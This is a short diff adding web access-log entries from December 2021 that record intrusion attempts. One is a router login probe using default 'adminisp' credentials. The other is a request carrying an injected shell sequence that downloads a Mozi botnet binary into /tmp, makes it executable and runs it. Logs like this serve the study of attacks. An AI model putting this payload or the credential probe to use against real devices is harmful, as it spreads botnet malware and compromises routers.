@@ -1,0 +1,3 @@
+182.116.82.174 - - [05/Dec/2021 00:57:50] "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0" 404 -
+
+31.32.120.79 - - [05/Dec/2021 02:32:42] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" HTTPStatus.BAD_REQUEST -
